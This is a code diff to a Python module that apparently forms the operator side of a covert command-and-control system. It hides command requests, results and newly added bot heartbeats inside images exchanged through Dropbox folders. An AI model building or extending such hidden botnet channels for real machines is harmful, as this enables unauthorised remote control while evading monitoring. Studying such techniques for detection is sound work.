@@ -1,9 +1,12 @@
 from typing import Set, List
+
+from common.dataclasses.heartbeat import Heartbeat
 from common.dropbox_wrapper import list_files, DropboxFolders, create_folder, upload_file, \
     list_files_in_folder, download_file, delete_file_in_folder, download_all_files_from_folder
 from common.dataclasses.commands import CommandExecutionRequest, CommandExecutionResult
 from common.image_generators.image_generator import generate_image
-from common.steganography import insert_command_request_into_image, read_command_result_from_image
+from common.steganography import insert_command_request_into_image, read_command_result_from_image, \
+    read_heartbeat_from_image
 from common.utils.string_utils import generate_unique_image_name
 
 __IMAGE_HORIZONTAL_DIMENSION = 640
@@ -44,3 +47,9 @@ def download_and_delete_command_execution_results_from_dropbox() -> List[Command
         command_results.append(read_command_result_from_image(file.payload))
         delete_file_in_folder(DropboxFolders.COMMAND_RESULTS, file.name)
     return command_results
+
+
+def download_heartbeats() -> List[Heartbeat]:
+    downloaded_files = download_all_files_from_folder(DropboxFolders.BOT_HEARTBEATS)
+    heartbeats = map(lambda file: read_heartbeat_from_image(file.payload), downloaded_files)
+    return list(heartbeats)
